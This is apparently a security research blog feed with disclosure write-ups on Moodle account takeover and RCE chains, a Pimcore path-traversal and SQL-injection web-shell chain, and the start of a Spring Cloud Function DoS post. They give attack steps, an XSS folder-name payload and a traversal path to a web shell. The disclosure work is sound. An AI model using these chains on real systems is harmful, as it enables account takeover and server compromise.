[{"title":"Playing Dominos with Moodle's Security (2/2)","url":"/2023/08/28/Playing Dominos with Moodle's Security 2/","content":"# Introduction\nIn our endeavor to enhance the security of the open-source realm and gain a deeper understanding of real-world vulnerabilities, we are constantly conducting audits of open-source projects, and the outcomes of this are presented in our two articles on Moodle security. This is the second blog covering another critical finding we discovered when auditing Moodle for security vulnerabilities. \n\nIn the first blog, we demonstrated how an unauthorized attacker could turn an arbitrary folder creation into a Cross-Site Scripting (XSS) vulnerability, ultimately resulting in Remote Code Execution (RCE). The second part of the series follows the same line of starting with a considerably low-impact bug at first glance, but with some steps, attackers can leverage it to a full account takeover. \n\n# Impact\nMoodle versions before 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 are susceptible to Account Takeover (ATO) via self-XSS in the WYSIWYG editor – this is tracked as CVE-2023-40320. On Moodle instances where [OAuth](https://en.wikipedia.org/wiki/OAuth) authentication is enabled, victims' accounts can be compromised with a simple click on a link.\n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/njeXbu85yzM\" title=\"Demonstration of Moodle vulnerabilities (CVE-2023-40320) on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we will discuss the technical details of the vulnerability and explain how attackers might exploit this kind of vulnerability.\n\n## Background\nA self-XSS vulnerability is when an attacker can execute arbitrary JavaScript code but the only one being affected by it is the attacker itself. To exploit this type of XSS, an attacker usually would need a high level of victim interaction, such as copying and pasting the payload to the vulnerable website. In many cases, this issue would not be considered a vulnerability, and even in the case of the Moodle vulnerability disclosure program, self-XSS is [out of scope](https://moodle.org/mod/page/view.php?id=8722#:~:text=Self%2DXSS%20(unless%20there%20is%20a%20proven%20impact%20on%20other%20users)) **“(unless there is a proven impact on other users).”**\n\n# From Self-XSS to Account Takeover (CVE-2023-40320)\nOne of the initial steps we do when auditing an application is to use it as intended. Doing so helps us understand how it is supposed to behave and also brings many ideas to mind on how to manipulate the intended behavior the same way an attacker would. Pretty quickly we ran into the WYSIWYG editor in Moodle. \n\nBeing one of the core features of Moodle, it appears when editing a description of a user, writing an answer to a forum, submitting assignments, and many more.\n\nWe noticed that there is the possibility to input arbitrary HTML which will be rendered and executed in the editor (making this a self-XSS). But when submitting the payload to a public page (such as a forum, assignment, etc.), it gets sanitized on the server side and dangerous elements are removed – other users will never be affected by the payload. \n\n<img src=\"/img/blogs/Moodle/image-2.webp\" style=\"width: 100%;\"/>\n\nIn addition, the editor has a feature that automatically saves a user's WYSIWYG content by sending the unsanitized data periodically after a couple of seconds to the `/lib/editor/atto/autosave-ajax.php` endpoint:\n\n<img src=\"/img/blogs/Moodle/image-3.webp\" style=\"width: 100%;\"/>\n\nWhen loading the page again, the autosaved data is fetched from the same endpoint using the `actions[0][action]` parameter set to `resume`. In case a malicious payload was stored before, it will execute again by visiting the WYSIWYG page – this just became a Stored Self-XSS!\n\n# Exploitation strategies\nOne of the ways an attacker could leverage this type of bug to an impactful one is by manipulating a victim into logging in to a malicious account -> triggering the self-XSS -> raising the impact depending on the application. With it, this was the first exploitation idea we tested. After a small check, we saw that the login and logout features are CSRF-protected, meaning an attacker can’t log in or out on the victim’s behalf by manipulating them to visit a malicious website. \n\nIn this case, an attacker needs to find some kind of “magic link” (a single link that logs in a user without a password, usually using a one-time token). The first idea we wanted to test is via an OAuth login. Yet again this endpoint was protected by a GET parameter `sesskey` which acts as a CSRF token. At this point, we decided that code auditing would yield better results than quick tests. \n\nFollowing the normal login procedure, the function that logs in a user is called `complete_user_login`. This function is called after the authentication is verified and would also log out the current user if there is one. Upon examining all the calls made to this function, we discovered several endpoints. However, we observed that they either verifying new accounts (Moodle accounts must be verified before users can access them, meaning an attacker can’t pre-deploy the self-XSS) or prohibited logging in if a session already existed. Changing the email of an existing account would send a confirmation message but the link provided only confirms and does not login, unlike the confirmation link when registering a new account.\n\n# OAuth Authentication Flows\nBut then we came across `auth/oauth2/confirm-linkedlogin.php` \n\n```php\n$token = required_param('token', PARAM_RAW);\n$username = required_param('username', PARAM_USERNAME);\n$userid = required_param('userid', PARAM_INT);\n$issuerid = required_param('issuerid', PARAM_INT);\n$redirect = optional_param('redirect', '', PARAM_LOCALURL);    // Where to \n//...\n$confirmed = \\auth_oauth2\\api::confirm_link_login($userid, $username, $issuerid, $token);\n\n\nif ($confirmed) {\n//...\n   if (!$user->suspended) {\n       complete_user_login($user);\n    //...\n       if (!empty($redirect)) {\n           redirect($redirect);\n       }\n//...\n```\n\nHere, if the link is valid, a login will happen. Without any verification that another user is already logged in, this is the only endpoint that does that. In addition to that, there is the possibility to pass a local `$redirect` URL that will redirect the user after the login!\n\nBut what is `oauth2/confirm-linkedlogin.php` and how an attacker would get here?\nFirst, we need to understand that this is possible only in a Moodle instance with some kind of OAuth enabled. In it, a user can log in via their OAuth account or link/unlink OAuth to an existing account. In case it's the first OAuth login a new account will be created with linked OAuth. **But** in case there is already an account with the same email address as the OAuth account, Moodle will link those accounts and send this `confirm-linkedlogin` confirmation link by email.\n\n<img src=\"/img/blogs/Moodle/image-4.webp\" style=\"width: 100%;\"/>\n\n# Exploitation\nHere are the specific number of steps an attacker would need to do to craft an account takeover attack:\n\n1. The attacker has an account with a controlled email same as the OAuth provider (for example, if Moodle has Google’s OAuth then the email should be a Gmail address). In this demonstration, let's say an attacker is logged in with attacker@gmail.com. \n\n2. The attacker’s account shouldn’t be linked to OAuth (can be unlinked in the user options in case it's already linked).\n\n3. Attacker creates a self-XSS payload that logs in using the current browser’s OAuth (done automatically without requiring credentials) using an iframe pointing to:\n`/auth/oauth2/login.php?id=2&wantsurl=%2F&sesskey=${M.cfg.sesskey}` (the `M.cfg.sesskey` is the current session’s CSRF protection). Since the Iframe has the same origin as the main page, the XSS code can freely access the newly created session in the Iframe.\n\n4. An attacker account adds the self-XSS payload to a WYSIWYG input and waits for the autosave.\n\n5. Attacker logs out.\n\n6. The attacker logs in with **OAuth** (using attacker@gmail.com). Moodle will see that there is already an account with the same email address and will generate a confirmation URL that links the Moodle account to the OAuth. That URL will be sent by email. \n\n7. Attacker adds the `redirect` parameter to the URL that will point to the self-XSS containing page: `http://moodle-domain/auth/oauth2/confirm-linkedlogin.php?token=...&userid=11&username=...&issuerid=...&redirect=http://moodle-domain/user/edit.php?id=11%231`\n\n8. Any user who clicks on the newly crafted link will be logged in to the attacker’s account and redirected to the self-XSS page.\n\n<img src=\"/img/blogs/Moodle/image-5.webp\" style=\"width: 100%;\"/>\n\n9. The victim triggers the self-XSS payload in the context of the attacker's account. It creates a new frame in which the victim is authenticated back in their own account via OAuth. Both the parent document (attacker's session) and the frame (victim's session) share the same origin, so the payload has full access to everything inside the frame. \n\n<img src=\"/img/blogs/Moodle/image-6.webp\" style=\"width: 100%;\"/>\n\n10. From here, the attacker has full control over the victim's account. For example, using the following iframe’s onload event code will show an alert with the victim’s cookie: `alert('hijacked cookie:' + document.cookie);`. Any other action can be done directly in the frame on the victim's behalf. In case the victim account has admin privileges, code execution on the server can be achieved (as demonstrated in our [previous](https://www.sonarsource.com/blog/playing-dominos-with-moodles-security-1/) blog).\n\n\n# Patch\nThe vulnerability was [fixed](https://github.com/moodle/moodle/commit/3d3dd827fae6db06f8f2a265ef38cfd5566d0c17) in versions 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 by removing the call to the `complete_user_login` function, causing the `confirm-linkedlogin.php` endpoint to not automatically login the user by clicking the link. \n\n```diff\n- if (!$user->suspended) {\n-         complete_user_login($user);\n-         \\core\\session\\manager::apply_concurrent_login_limit($user->id, session_id());\n\n+    if ($user->id == $USER->id) {\n//...\n```\n\nClicking a malicious link now will not log in to the attacker’s account and thus no self-XSS is executed on the victim (though stored self-XSS is still possible in the WYSIWYG editor).\n\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-03-22 | We report all issues to the vendor |\n| 2023-08-10 | Vendor patched the vulnerability |\n| 2023-08-21 | Vendor released security advisory and CVE-2023-40320 was assigned |\n\n# Summary\nIn this article, covering our second critical vulnerability found in Moodle, we demonstrated how attackers can leverage the self-XSS vulnerability to an impactful Account Takeover. Considering that, in addition to our first blog in the series covering another innocent initial bug to RCE, it is important to not overlook those innocuous issues. \n\nBy focusing on clean code practices, developers write software that is clear, maintainable, and understandable. These qualities make it easier to spot and address vulnerabilities during development, reducing the risk of introducing security flaws that could be exploited by attackers. It is important to address all security issues in order to reduce the chance of bug chains.\n\nWe would also like to thank Moodle again for their responsiveness and great communication.","tags":["moodle","ato","account take over","oauth"]},{"title":"Playing Dominos with Moodle's Security (1/2)","url":"/2023/08/21/Playing Dominos with Moodle's Security 1/","content":"# Introduction\nMoodle is an open-source learning management system (LMS) used to create and deliver online courses. It was first developed in 2002 by Martin Dougiamas and is now widely used by educators and institutions around the world, earning the trust of educational institutions worldwide, with its user base exceeding 350 million across 242 countries. \n\nMoodle provides a platform for teachers and trainers to create online courses and learning materials, manage course content, and interact with students through a range of communication tools such as discussion forums, messaging systems, and more.\n\nCompromising a Moodle instance could considerably impact schools and universities. From simple grade cheating to infiltrating internal networks, shutting down a whole university, and more. An attacker can potentially cause significant harm to an educational institution.\n\nThis is the first blog in a two-part series where we will present our findings on a Moodle security audit we conducted. We were drawn to researching the security aspect of the framework due to its popularity, with the goal of contributing to a safer internet.\n\nIn this first article, we demonstrate how an unauthenticated attacker can leverage a vulnerability with a supposedly low impact to gain full control over the Moodle instance.\n\n# Impact\nMoodle versions 4.1.x before 4.1.3 and 4.2.x before 4.2.0 are susceptible to an unauthenticated arbitrary folder creation, tracked as CVE-2023-30943. An attacker can leverage the creation of arbitrary folders to carry out a Stored Cross-Site Scripting (XSS) attack on the administration panel, resulting in arbitrary code execution on the server as soon as an administrator visits the panel.\n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/pevHGKKOsqU\" title=\"Demonstration of Moodle vulnerabilities (CVE-2023-30943) on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we discuss the origin of the vulnerability and how an attacker can turn an arbitrary folder creation into a Stored Cross-Site Scripting vulnerability and then execute arbitrary commands.\n\n## Background\nLike many other applications, Moodle has its own permission/authorization levels, using roles such as students, teachers, managers, etc. An administrator account can install arbitrary plugins (PHP code). This feature allows an administrator to execute code on the server by design.\n\nBy default, the register feature is disabled on Moodle: this is mainly because schools usually don't want random people to register and login into their Moodle, but only their students. For example, only after a student is accepted by a university, they will manually create a Moodle user and provide the student with their login credentials. \n\n# From arbitrary folder creation to RCE (CVE-2023-30943)\nAlthough the attack surface for an unauthenticated attacker is minimal, we found two interesting endpoints that do not require authentication.\n\nBoth of the following endpoints take a `RAW` typed input from the `rev` parameter and generate a custom path that includes the provided `rev` parameter in the middle. Later, a folder will be created on this path if it doesn't exist. Since the parameter type is `RAW` (no modification or sanitization by Moodle) and its value is inserted in the middle of the path string, an attacker can create arbitrary folders on the server by using path traversal sequences. Without control over any files (names, paths, nor data) the impact of this weird bug is questionable at first glance. \n\n* lib/editor/tiny/lang.php\n```php\n$rev  = min_optional_param('rev', 0, 'RAW');\n$lang = min_optional_param('lang', 'standard', 'SAFEDIR');\n//...\n$this->candidatefile = \"{$CFG->localcachedir}/editor_tiny/{$this->rev}/lang/{$this->lang}/lang.json\";\n//...\n@mkdir(dirname($this->candidatefile), $CFG->directorypermissions, true);\n//...\n```\n* lib/editor/tiny/loader.php\n```php\n$this->rev  = min_optional_param('rev', 0, 'RAW');\n$this->filepath = min_optional_param('filepath', 'standard', 'SAFEPATH');\n//...\n$this->candidatefile = \"{$CFG->localcachedir}/editor_tiny/{$this->rev}/{$filepathhash}\";\n//...\n@mkdir(dirname($this->candidatefile), $CFG->directorypermissions, true);\n//...\n```\n\nIn order to determine ways, how this could be exploited, we can assume that any folder name on the server is equivalent to an attacker’s input. From here we can go over all PHP code, that interacts with folders/files and consider them as sources. \n\nSome of the PHP functions, which should be considered for example:\n* glob\n* *dir (scandir/opendir/readdir/closedir)\n* realpath\n* …\n\nUsing this approach, we encountered an interesting code flow. When an admin visits the site administration page the following code is executed:\n\n`lib/adminlib.php`\n```php\n       foreach (glob($CFG->dirroot.'/'.$CFG->admin.'/settings/*.php') as $file) {\n           if ($file == $CFG->dirroot.'/'.$CFG->admin.'/settings/top.php') {\n               continue;\n           }\n           if ($file == $CFG->dirroot.'/'.$CFG->admin.'/settings/plugins.php') {\n           // plugins are loaded last - they may insert pages anywhere\n               continue;\n           }\n           require($file);\n       }\n```\nThe loop iterates over every file that ends with `.php` in the `admin/settings` and tries to `require` it. An attacker can simply add a folder that ends with `.php` at `/var/www/html/admin/settings/*.php` and crash all administration pages. \n\n<img src=\"/img/blogs/Moodle/image-1.webp\" style=\"width: 100%;\"/>\n\nThis attack on the admin panel is limited to a Denial of Service (DoS), but we were curious, if attackers may even gain RCE.\n\n## XSS from arbitrary folder creation\nMoodle offers methods for teachers and students to share learning materials and submissions, which could be in the form of files like word-processed documents or slideshow presentations. By default, Moodle supports a number of file types. An administrator can [add](https://docs.moodle.org/402/en/Working_with_files#Adding_a_new_file_type) other file types to their Moodle instance. Doing so requires choosing a corresponding icon that will represent the file type. \n\n\nThe code at `admin/tool/filetypes/classes/utils.php` lists the available icons by iterating over the files (**including folders**) that end with `.svg`/`.gif`/`.png` in a dedicated path: \n\n```php\npublic static function get_icons_from_path($path) {\n        $icons = array();\n        if ($handle = @opendir($path)) {\n            while (($file = readdir($handle)) !== false) {\n                $matches = array();\n                if (preg_match('~(.+?)(?:-24|-32|-48|-64|-72|-80|-96|-128|-256)?\\.(?:svg|gif|png)$~',\n                        $file, $matches)) {\n                    $key = $matches[1];\n                    $icons[$key] = $key;\n                }\n            }\n            closedir($handle);\n        }\n        ksort($icons);\n        return $icons;\n    }\n```\n\nThe name of the files/folders are displayed on the page without sanitization (`admin/tool/filetypes/edit_form.php`):\n\n```php\n$fileicons = \\tool_filetypes\\utils::get_file_icons();\n$mform->addElement('select', 'icon', get_string('icon', 'tool_filetypes'), $fileicons);\n```\n\nIn order to inject malicious JavaScript code, an attacker can create the following folder:\n`var/www/html/pix/f/<input><img src=x onerror=alert(1)>.png`\n\nWhen an admin tries to add a new filetype from the server settings page (http://moodle-domain/admin/tool/filetypes/edit.php?name=add), the folder name is reflected on the HTML page, and the JavaScript payload is executed in the context of the admin account.  Because the folder name is reflected inside a `select` tag the attacker needs an `input` tag first to [break out](https://html.spec.whatwg.org/#parsing-main-inselect), causing the `img` to render and JavaScript to run. This vulnerability can be exploited in a Cross-Site Scripting (XSS) attack against an admin user to achieve remote code execution on the server, as [demonstrated](https://cube01.io/blog/Moodle-DOM-Stored-XSS-to-RCE.html) before via plugin installation. \n\n[Plugins](https://docs.moodle.org/402/en/Installing_plugins) in Moodle are additional PHP code made to provide custom features and functionalities. Using Moodle’s web interface, admins can conveniently install user [shared](https://moodle.org/plugins/) plugins, or install their own from a local zip. Since plugins are simply PHP code, an attacker-controlled plugin is equivalent to arbitrary code execution.\n\nThere are probably other ways to exploit this vulnerability, but this XSS on the “new filetype” page demonstrates how an unauthenticated attacker can execute arbitrary code on the Moodle server by installing a malicious plugin.\n\n# Patch\nThe vulnerability was [fixed](https://github.com/moodle/moodle/commit/59d42e1ed23f916dcb47d53c745bef18a116d800) in versions 4.1.3 and 4.2.0 by casting the `$rev` parameter to integers in both files:\n```diff\n            [$rev, $lang] = explode('/', $slashargument, 2);\n-           $rev  = min_clean_param($rev, 'RAW');\n+           $rev  = min_clean_param($rev, 'INT');\n            $lang = min_clean_param($lang, 'SAFEDIR');\n        } else {\n-           $rev  = min_optional_param('rev', 0, 'RAW');\n+           $rev  = min_optional_param('rev', 0, 'INT');\n            $lang = min_optional_param('lang', 'standard', 'SAFEDIR');\n        }\n```\n```diff\n            [$rev, $filepath] = explode('/', $slashargument, 2);\n-           $this->rev  = min_clean_param($rev, 'RAW');\n+           $this->rev  = min_clean_param($rev, 'INT');\n            $this->filepath = min_clean_param($filepath, 'SAFEPATH');\n        } else {\n-           $this->rev  = min_optional_param('rev', 0, 'RAW');\n+           $this->rev  = min_optional_param('rev', 0, 'INT');\n            $this->filepath = min_optional_param('filepath', 'standard', 'SAFEPATH');\n        }\n```\n\nNow, an attacker cannot control the name of a folder nor traverse back directories in order to create arbitrary folders on the server.\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-03-22 | We report all issues to Vendor |\n| 2023-04-19 | Vendor patched the vulnerability |\n| 2023-05-01 | Vendor released security advisory and CVE-2023-30943 was assigned |\n# Summary\nIn this article, we showed how an unauthenticated actor could create an arbitrary folder on a Moodle server, an apparently innocuous action, to then trigger a Cross-Site Scripting vulnerability on the administration panel. With existing features of Moodle, this primitive can be turned into Remote Code Execution, ultimately granting an unauthenticated attacker arbitrary code execution on the server. \n\nIn the second article coming on August 29th, we will dive into how attackers could take over accounts by chaining minor vulnerabilities.\n\nWe would also like to thank Moodle for their responsiveness and great communication.","tags":["rce","moodle","unauthenticated","unauth"]},{"title":"Pimcore: One click, two security vulnerabilities","url":"/2023/05/15/Pimcore- One click, two security vulnerabilities/","content":"# Introduction\nThe Pimcore Platform provides software for central management of corporate data. With over 100,000 clients across 56 countries, including some major vendors, it has become a trusted choice for businesses worldwide. Available in both an Enterprise subscription as well as an Open Source Community Edition with a growing community of developers and users.\n\nWe make a consistent effort to enhance the technology powering our Clean Code solution by frequently scanning open-source projects and assessing the outcomes. In the case of Pimcore, our engine reported an interesting limited directory traversal vulnerability. After analyzing the finding we found an additional SQL Injection vulnerability in the same endpoint. Leveraging those two vulnerabilities, an admin that clicks on an attacker’s crafted link will execute arbitrary code on the server.\n\n# Pimcore Vulnerabilities Impact\nPimcore versions prior to 10.5.19 are susceptible to both a **path traversal** and an **SQL injection** vulnerability in the `create-csv` endpoint tracked as CVE-2023-28438. The two vulnerabilities can be exploited with a single GET request. Because of this, an attacker can create a malicious link, which can cause the **execution of arbitrary code** when accessed by an admin. \n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/7ODgHHyhuqg\" title=\"Demonstration of Pimcore vulnerabilities on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we will discuss the technical details of the vulnerabilities and explain how an attacker could combine them to create a one-click exploit that will deploy a web shell on the server.\n\n## Limited Arbitrary File Write and Path Traversal\nScanning Pimcore with SonarCloud uncovered an interesting path traversal issue caused by passing user-controlled data as the filename parameter of `fopen`. You can inspect the finding directly on SonarCloud:\n\n[Try it by yourself on SonarCloud!](https://sonarcloud.io/project/issues?resolved=false&types=VULNERABILITY&id=SonarSourceResearch_pimcore-blogpost&open=AYbwBqEGzBX2hF8LIsrC&_gl=1*h7icnc*_gcl_au*OTE1ODQ0MTAxLjE2OTg1MTM1NzM.*_ga*MTIwOTcxMTcxNi4xNjk4NTEzNTcz*_ga_9JZ0GZ5TC6*MTY5ODU5NTQzMS4yLjEuMTY5ODU5NTQ3Ny4xNC4wLjA.)\n\nThe underlined feature is in the admin panel of Pimcore which enables the display of statistical reports on various aspects of the website. An admin can create custom reports, view them directly from the panel, or download the data in CSV format:\n\n<img src=\"/img/blogs/pimcore/image1.webp\" style=\"width: 100%;\"/>\n\nUpon further inspection of the vulnerable function `createCsvAction`, we found out that the user-controlled data is passed through the `admin/reports/custom-report/create-csv` endpoint’s `exportFile` parameter. Although this endpoint is only accessible by admins, it is a GET request endpoint with no CSRF protection, thus manipulating an admin to click on a link is enough.\n\nThe value of the `exportFile` parameter is appended to the web root path without prior sanitization, allowing an attacker to control the extension as well as traverse back in the folder path. \n\nOn continued inspection of the code, we can see that the user-controlled path will end up opening a file in “append” mode. Writing the `getData` function’s output to it using `fputcsv`:\n\n```php\npublic function createCsvAction(Request $request)\n   {\n       //...\n       $filters = $request->get('filter') ? json_decode(urldecode($request->get('filter')), true) : null;\n       $drillDownFilters = $request->get('drillDownFilters', null);\n       //...\n       $result = $adapter->getData($filters, $sort, $dir, $offset * $limit, $limit, $fields, $drillDownFilters);\n\n\n       if (!($exportFile = $request->get('exportFile'))) {\n           $exportFile = PIMCORE_SYSTEM_TEMP_DIRECTORY . '/report-export-' . uniqid() . '.csv';\n           @unlink($exportFile);\n       } else {\n           $exportFile = PIMCORE_SYSTEM_TEMP_DIRECTORY.'/'.$exportFile;\n       }\n\n\n       $fp = fopen($exportFile, 'a');\n\n\n       if ($includeHeaders) {\n           fputcsv($fp, $fields, ';');\n       }\n\n\n       foreach ($result['data'] as $row) {\n           $row = Service::escapeCsvRecord($row);\n           fputcsv($fp, array_values($row), ';');\n       }\n\n\n       //...\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/928a964c13a5c9992cff4b5abdb25847529604d3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L422%C2%A0)\n\nUp until now, an attacker can control the CSV output file path, name, and extension. Although this allows the creation of PHP files on the server, an attacker will need to control the file content as well in order to execute arbitrary code. Here enters the second vulnerability, an SQL Injection in the `getData` function.\n\n## 1st SQL Injection sink\nLooking at the `createCsvAction` function from earlier, the inputs an attacker can control are `$drillDownFilters` and `$filters`, which are passed on to `getBaseQuery`:\n\n```php\n public function getData($filters, $sort, $dir, $offset, $limit, $fields = null, $drillDownFilters = null)\n   {\n       $db = Db::get();\n\n\n       $baseQuery = $this->getBaseQuery($filters, $fields, false, $drillDownFilters);\n       //...\n       if ($baseQuery) {\n           $total = $db->fetchOne($baseQuery['count']);\n           //...\n           $sql = $baseQuery['data'] . $order;\n           //...\n           $data = $db->fetchAllAssociative($sql);\n      //...\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L29)\n\nTwo SQL queries are issued with the result of the `getBaseQuery` function:\n\n1. `$baseQuery[‘count’]`: a query that returns the number of results using `COUNT(*)` will be used in `$db->fetchOne`.\n2. `$baseQuery[‘data’]`: will end up in `$db->fetchAllAssociative` and fetch the results.\n\nThis is how the `getBaseQuery` function that prepares those two queries looks like:\n```php\nprotected function getBaseQuery($filters, $fields, $ignoreSelectAndGroupBy = false, $drillDownFilters = null, $selectField = null)\n   {\n\t//...\n       $sql = $this->buildQueryString($this->config, $ignoreSelectAndGroupBy, $drillDownFilters, $selectField);\n       //...\n               foreach ($filters as $filter) {\n                   $operator = $filter['operator'];\n                   //..\n                   switch ($operator) {\n\t\t\t//..\n                       case '=':\n                           $fields[] = $filter['property'];\n                           $condition[] = $db->quoteIdentifier($filter['property']) . ' = ' . $db->quote($value);\n    \t\t//...\n           $total = 'SELECT COUNT(*) FROM (' . $sql . ') AS somerandxyz WHERE ' . $condition;\n           if ($fields && !$extractAllFields) {\n               $data = 'SELECT `' . implode('`,`', $fields) . '` FROM (' . $sql . ') AS somerandxyz WHERE ' . $condition;\n           }\n\t\t//...\n       return [\n           'data' => $data,\n           'count' => $total,\n       ];\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L150)\n\nAt first glance, we noticed an injection at the `$data` parameter, the SQL query's `SELECT` fields are not sanitized. The ```implode('`,`', $fields)``` can simply be escaped with backticks.\n\nIn order to control the `$fields` parameter we need to set the `$filters['operator']` attribute accordingly (in the code snippet only '=' is shown but there are other options) and then the `'property'` attribute will be appended to it. Immediately after a `$condition` string will be created. So in order to control the `$fields` value the `$condition` string will be present. \n\nHowever, while it seems like there is a simple SQL injection at `$data`, the `$condition` variable is concatenated to the end of both queries (`count` and `data`). And due to the quotation escaping (done using the functions `$db->quoteIdentifier` and `$db->quote`), any field containing a backtick character (`) will be doubled and thus making the query's syntax invalid.\n\nWe can of course comment out the rest of the query (using `--` or `;`) to avoid the syntax breaking `$condition`. But the `$total` query also has the broken `$condition`, and later be used in the line `$db->fetchOne($baseQuery['count'])` before fetching with the SQL Injected `data` query, thus raising an exception and not executing the SQL Injection.\n\n## 2nd SQL Injection sink\nSo we have an SQL Injection, but exploiting it will always cause a syntax error. Is there any other way to somehow ignore the `$condition` string?\n\nSome of you probably already noticed that before every `$condition` there is the `$sql` parameter, which is returned from `$this->getBaseQuery(...)`. If there is an SQL Injection in that function as well we can end the query before the syntax error.\n\n```php\nprotected function buildQueryString($config, $ignoreSelectAndGroupBy = false, $drillDownFilters = null, $selectField = null)\n   {\n       //...\n       if ($drillDownFilters) {\n           $havingParts = [];\n           $db = Db::get();\n           foreach ($drillDownFilters as $field => $value) {\n               if ($value !== '' && $value !== null) {\n                   $havingParts[] = \"$field = \" . $db->quote($value);\n               }\n           }\n\n\n           if ($havingParts) {\n               $sql .= ' HAVING ' . implode(' AND ', $havingParts);\n           }\n       }\n       return $sql;\n   }\n```\n\nAuditing the `buildQueryString` function we found another SQL Injection sink but now using the `$drillDownFilters` parameter. Though the value is being quoted, the field isn't. An attacker can use this sync to comment out the broken `$condition` and execute arbitrary SQL queries.\n\n# Exploitation - connecting everything together\nSo an attacker can control the output file and inject SQL to the function that fetches results which will end up in that file. Having the export file path pointing to a PHP file in the web root is straightforward using: \n\n```\n../../../../../../../../var/www/html/public/webshell.php\n```\n\nA PHP file will execute also if there is the PHP declaration randomly in the file, meaning a file doesn't have to start with `<?php`, so we don't have to worry about that. \n\nBut how can an attacker exploit the SQL Injection to result in arbitrary content?\n\nHaving multiple queries, one that inserts custom data and another that fetches it is possible but makes the exploit more complicated. Going back to our SQL query, the injection is in the SELECT fields, so we can use the [CASE expression](https://www.w3schools.com/sql/sql_case.asp).\n\nLastly, there are two parameters needed for the get request: \n\n* `headers=true` is to output the field names to the CSV\n* `name=Quality_Attributes` is a default name of a report from the demo app (in order to execute the vulnerable function the name has to be a valid report)\n\nCombining those 2 vulnerabilities from 3 sinks in 1 GET request an attacker could create a malicious link that will deploy a web shell on the server.\n\n# Patch\nBoth vulnerabilities were fixed in Pimcore version 10.5.19:\n\n* The SQL Injection was fixed by adding db->quoteIdentifier(...) in the field name as well.\n```php\n$havingParts[] = ($db->quoteIdentifier($field) .\" = \" . $db->quote($value));\n```\n* The path traversal was fixed by:\n\t* Verifying that the extension is “.csv”\n\t* Normalizing the path to prevent traversing \n```php\n$exportFileName = basename($exportFileName);\nif(!str_ends_with($exportFileName, \".csv\")) {\n      throw new InvalidArgumentException($exportFileName . \" is not a valid csv file.\");\n}\nreturn PIMCORE_SYSTEM_TEMP_DIRECTORY . '/' . $exportFileName;\n```\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-02-20 | We reported all issues to Vendor |\n| 2023-03-15 | Vendor released patch version 10.5.19 |\n| 2023-03-22 | CVE-2023-28438 and [security advisory](https://github.com/pimcore/pimcore/security/advisories/GHSA-vf7q-g2pv-jxvx) released |\n\n# Summary\nThe focus of our blog post was on our success in identifying and utilizing two distinct vulnerabilities with a single GET request, ultimately leading to code execution. This serves as a powerful demonstration of our product's capability to detect security flaws, and we also highlighted the step-by-step process we followed from analyzing the results to creating a weaponized exploit.\n\nWe would like to thank the maintainers again for the quick response and for handling the situation professionally.","tags":["php","rce","sqli","path traversal"]},{"title":"Spring Function Cloud DoS (CVE-2022-22979) and Unintended Function Invocation","url":"/2022/06/26/Spring Function Cloud DoS (CVE-2022-22979) and Unintended Function Invocation/","content":"# Introduction\nThe Spring Framework application provides a flexible and comprehensive method for programming and configuring Java-based enterprise applications. One of the main purposes of Spring is to relieve developers from many infrastructural tasks so they can focus on writing application business logic.\n\nSpring consists of many projects and frameworks (that contain subprojects) where each one has its own objective and can be easily integrated into a larger Spring application. In our research, we focused\n\non the [Spring Cloud framework](https://spring.io/projects/spring-cloud) and specifically on the [Spring cloud function project](https://spring.io/projects/spring-cloud-function), which resulted in the findings of a denial of service (DoS) vulnerability and an unintended function invocation. The Cloud framework provides tools for developers to write their applications in a distribution environment, with technologies such as routing, load-balancing, circuit breakers, and more.\n\nThe function project opens an API (via a web endpoint, a stream processor, or a task) to run specific functions which fit a Spring Bean definition, reducing development overhead and boilerplate by mapping the function directly to a route.\n\n# Overview\nNow that we are familiar with the purpose of the project, let’s take a deep dive into the features and code functionality.\nThe web endpoint provides two methods to invoke functions:\n\n1. Via the URI ‘/functionRoute’, where the invoked bean function name is provided in one of the headers: spring.cloud.function.routing-expression / spring.cloud.function.definition.\n2. Or have the name of the function in the URI itself - for example http://host/function_name.\n\nBoth will end up invoking the same vulnerable function, but we will use the latter in the examples since it is simpler to demonstrate.\n\nAn interesting mechanism is in case the function input’s is an object. Spring will try to construct the object (only if it has a default/nullary constructor) and expose the setters to the user’s input. For instance, we have the function “isBigTree” which gets an object Tree that has a default/nullary constructor and a setter “setHeight”. We can call the function via POST to http://host/isBigTree using the payload {‘height’:50}, the function will receive a Tree object with the height = 50.\n\nIn addition, there is a feature that enables us to chain multiple functions which will be executed one after the other (and pass the output of one as an input to the next one) via the ‘,’ or ‘|’ char. For example, the URL http://host/function_a,function_b, will run function_a and pass its output as an input to function_b. \n\n\nSo, let’s say function_b receives an object without a default/nullary constructor, we couldn’t call it directly, but in case function_a’s output is the same object type we can chain those functions together.\n\n# Denial-of-Service (DoS) - Flooding The Function Router\n## Technical Details\nThe function name from the URL will end up in the [lookup](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103) function which will try to determine and retrieve the function itself. The lookup function has a ‘cache’ mechanism 